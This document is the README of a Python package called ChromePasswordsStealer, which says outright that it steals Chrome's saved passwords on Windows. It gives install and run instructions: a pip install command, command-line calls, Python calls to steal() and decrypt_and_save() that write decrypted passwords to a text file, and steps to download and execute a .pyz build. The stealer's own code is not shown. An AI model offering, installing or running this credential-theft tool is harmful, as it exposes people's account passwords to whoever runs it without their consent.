# ChromePasswordsStealer

## Description
This package steal chrome password on Windows.

## Requirements
This package require :
 - python3
 - python3 Standard Library
 - pywin32

## Installation
```bash
pip install ChromePasswordsStealer
```

## Launcher

## Command line:
```bash
ChromeStealer # get chromes passwords and save it in "passwords.txt"
ChromeStealer save_passwords.txt # get chromes passwords and save it in "save_passwords.txt"
```

### Python script
```python
from ChromePasswordsStealer import ChromePasswordsStealer, steal

steal() # get chromes passwords and save it in "passwords.txt"

stealer = ChromePasswordsStealer(filename="save_passwords.txt")
stealer.decrypt_and_save() # get chromes passwords and save it in "save_passwords.txt"
```

### Python executable:
```bash
python3 ChromePasswordsStealer.pyz save_passwords.txt

# OR
chmod u+x ChromePasswordsStealer.pyz # add execute rights
./ChromePasswordsStealer.pyz aaa # execute file
```

### Python module (command line):

```bash
python3 -m ChromePasswordsStealer
python3 -m ChromePasswordsStealer.ChromePasswordsStealer save_passwords.txt
```

## Links
 - [Github Page](https://github.com/mauricelambert/ChromePasswordsStealer/)
 - [Documentation](https://mauricelambert.github.io/info/python/security/ChromePasswordsStealer.html)
 - [Download as python executable](https://mauricelambert.github.io/info/python/security/ChromePasswordsStealer.pyz)
 - [Pypi package](https://pypi.org/project/ChromePasswordsStealer/)

## Licence
Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).
